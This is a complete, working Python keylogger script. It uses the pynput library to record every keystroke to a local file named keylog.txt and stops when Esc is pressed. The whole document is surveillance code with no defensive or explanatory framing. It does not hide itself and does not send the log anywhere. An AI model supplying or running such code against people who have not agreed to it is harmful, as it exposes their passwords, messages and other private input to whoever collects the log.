import pynput
from pynput.keyboard import Key, Listener

# Path to save the log file
log_file = "keylog.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as f:
        k = str(key).replace("'", "")
        if k == 'Key.space':
            f.write(' ')
        elif k == 'Key.enter':
            f.write('\n')
        elif k == 'Key.backspace':
            f.write('[BACKSPACE]')
        elif k == 'Key.tab':
            f.write('[TAB]')
        elif k == 'Key.shift':
            f.write('[SHIFT]')
        elif k == 'Key.esc':
            f.write('[ESC]')
        elif k == 'Key.caps_lock':
            f.write('[CAPS LOCK]')
        else:
            f.write(k)

# Function to handle each keystroke
def on_press(key):
    write_to_file(key)

# Function to stop the keylogger (when ESC is pressed)
def on_release(key):
    if key == Key.esc:
        return False

# Starting the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
